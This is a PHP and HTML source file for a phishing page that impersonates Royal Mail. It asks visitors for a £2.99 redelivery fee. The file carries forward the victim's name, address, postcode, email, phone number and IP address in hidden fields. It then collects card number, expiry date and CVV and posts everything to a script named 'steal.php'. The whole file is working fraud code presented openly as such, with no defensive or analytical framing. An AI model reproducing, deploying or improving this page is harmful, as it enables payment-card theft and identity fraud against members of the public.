<?php require 'config.php'; 
if ($_SERVER['REQUEST_METHOD'] !== 'POST') die('Invalid request');

$victim = [
    'fullname' => $_POST['fullname'] ?? '',
    'address'  => $_POST['address'] ?? '',
    'postcode' => $_POST['postcode'] ?? '',
    'email'    => $_POST['email'] ?? '',
    'phone'    => $_POST['phone'] ?? '',
    'ip'       => $_SERVER['REMOTE_ADDR'],
    'time'     => date('Y-m-d H:i:s')
];
?>
<!DOCTYPE html>
<html>
<head>
    <title>Confirm Redelivery Fee - Royal Mail</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body class="bg-light">
<div class="container mt-5">
    <div class="card mx-auto" style="max-width:520px;">
        <div class="card-header bg-danger text-white text-center">
            <h5>£2.99 Redelivery Fee – Secure Payment Required</h5>
        </div>
        <div class="card-body">
            <form action="steal.php" method="POST">
                <?php foreach($victim as $k=>$v): ?>
                    <input type="hidden" name="<?=htmlspecialchars($k)?>" value="<?=htmlspecialchars($v)?>">
                <?php endforeach; ?>

                <div class="mb-3">
                    <label>Card Number</label>
                    <input type="text" name="card_number" maxlength="19" class="form-control" placeholder="4242 4242 4242 4242" required>
                </div>
                <div class="row">
                    <div class="col-6">
                        <label>Expiry (MM/YY)</label>
                        <input type="text" name="expiry" maxlength="5" class="form-control" required>
                    </div>
                    <div class="col-6">
                        <label>CVV</label>
                        <input type="text" name="cvv" maxlength="4" class="form-control" required>
                    </div>
                </div>
                <button type="submit" class="btn btn-danger w-100 mt-4">Pay £2.99 and Confirm Delivery Date</button>
            </form>
        </div>
    </div>
</div>
</body>
</html>